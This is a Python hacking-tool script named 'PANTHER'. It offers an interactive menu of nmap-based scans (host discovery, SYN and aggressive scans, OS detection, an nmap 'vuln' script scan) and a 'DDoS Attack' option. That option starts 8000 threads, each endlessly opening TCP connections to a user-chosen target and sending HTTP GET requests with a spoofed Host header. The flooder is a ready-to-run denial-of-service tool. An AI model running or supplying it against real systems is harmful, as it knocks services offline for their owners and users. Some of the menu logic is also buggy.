#!/usr/bin/python3
import os
import platform
import socket
import sys
import nmap
import nmap3
import threading
from termcolor import colored
from pyfiglet import figlet_format
from time import sleep as timeout


def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)

print(colored(figlet_format("..PANTHER.."), color="cyan" ))



options = input("Choose which tool you want to use! \n 1.NMap Scan \n 2.DDoS Attack \n Enter your choice : ")

if options == "1" :
    os.system("clear")

    while True :


        print(colored(figlet_format("..PANTHER_MAP.."), color="green" ))

        scanner = nmap.PortScanner()
        print('++++++++++++++++++++++++++++++++++++Welcome to NMap Automation')
        print("==============================================================")

        mode = input("""\nEnter the type of scan!!!
                  [1] Domain LookUp
                  [2] Whole Network Scan
                  [3] Simple Network scan
                  [4] Aggressive Scan 
                  [5] CVE Scan
                  [00] Back\nEnter your option : """)
        print("\nYou have selected option: ", mode)
        if mode == '1' :
            print(colored(figlet_format(".DOMAIN.LOOKUP."), color="blue" ))

            url = input("Enter the Domain Name : ")
            print("IP :", socket.gethostbyname(url))

        elif mode == '2' :

            a = platform.system()
            if a == 'Windows' :
                print(os.system('ipconfig'))
            elif a == 'Linux' :
                print(os.system('ifconfig'))
            elif a == 'Darwin' :
                print(os.system('ifconfig'))

            ip = input("Enter the ip : ")
            print("Nmap Version: ", scanner.nmap_version())
            scanner.scan(ip, arguments='-n -sP -PE -PA21 ,23,80,3389')
            ip_list = [(x, scanner[x]['status']['state']) for x in scanner.all_hosts()]
            for host, status in ip_list :
                print(host, ':', status)

        elif mode == '3' :

            a = platform.system()
            if a == 'Windows' :
                print(os.system('ipconfig'))
            elif a == 'Linux' :
                print(os.system('ifconfig'))
            elif a == 'Darwin' :
                print(os.system('ifconfig'))

            ip = input("Enter the IP address : ")
            print("Nmap Version: ", scanner.nmap_version())
            scanner.scan(ip, '1-1024', arguments='-v -sS')
            for host in scanner.all_hosts() :
                print('Host : %s (%s)' % (ip, scanner[ip].hostname()))
                print('State : %s' % scanner[host].state())
                for proto in scanner[ip].all_protocols() :
                    print('----------')
                    print('Protocol : %s' % proto)

                    lport = scanner[ip][proto].keys()
                    lport = sorted(lport)
                for port in lport:
                    print('port : %s\t%s\t%s' % (port, scanner[ip][proto][port]['state'], scanner[ip][proto][port]['name']))

        elif mode == '4' :
            a = platform.system()
            if a == 'Windows' :
                print(os.system('ipconfig'))
            elif a == 'Linux' :
                print(os.system('ifconfig'))
            elif a == 'Darwin' :
                print(os.system('ifconfig'))

            ip_add = input('Enter the ip address : ')
            print("NMap Version:", scanner.nmap_version())
            scanner.scan(ip_add, '1-1024', arguments='-A')
            nmap1 = nmap3.NmapScanTechniques()
            results = nmap1.nmap_tcp_scan(ip_add, args="-A")
            print('Host:%s(%s)' % (ip_add, scanner[ip_add].hostname()))
            print('state:%s\n' % scanner[ip_add].state())
            i = 0
            while i < len(results[ip_add]) :
                ser = results[ip_add][i]['service']
                print('port: %s\t%s\t%s\t\t\t%s |\t\t\t%s' % (results[ip_add][i]['portid'],results[ip_add][i]['state'],ser.get('name',''),ser.get('product',''),ser.get('version','')))
                i = i+1
                os_det = results['os']
                os_cl = os_det[0].get('osclass','')
                print('\nOperating System: ',os_det[0].get('name',''),'\tAccuracy: ',os_det[0].get('accuracy',''))
                print('Vendor: ',os_cl.get('vendor',''))
                print('OS gen: ',os_cl.get('osgen',''),'\tAccuracy: ',os_cl.get('accuracy',''))
                print('CPE: ',os_det[0].get('cpe',''))

        elif mode == '5':
            print('Note :THIS OPTION ONLY WORKS WITH KALI LINUX ')


            def vulnhunt(IP):
                command = "nmap -script vuln -Pn " + IP
                process = os.popen(command)
                result = str(process.read())
                return result


            print(vulnhunt(input('enter the IP here:')))
        elif mode >= '6':
            print("Enter a valid option")

        elif mode == '00' or '0':
            restart_program()
        else :
            timeout(3)
            restart_program()

elif options == "2":
    os.system('clear')
    attack_num = 0
    print(colored(figlet_format(".DDOS.ATTACK."), color="red" ))
    target = str(input("Enter the target IP: "))
    port = int(input("Enter the target port: "))
    if target is None:
        restart_program()
    fake_ip = '10.23.12.45'


    def attack():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

            global attack_num
            attack_num += 1
            print(attack_num)

            s.close()


    for i in range(8000):
        thread = threading.Thread(target=attack)
        thread.start()

elif options >= '3':
    print("Error: Enter a valid option.")
elif options == '0':
    print("Error: Enter a valid option.")
else:
    timeout(3)
    restart_program()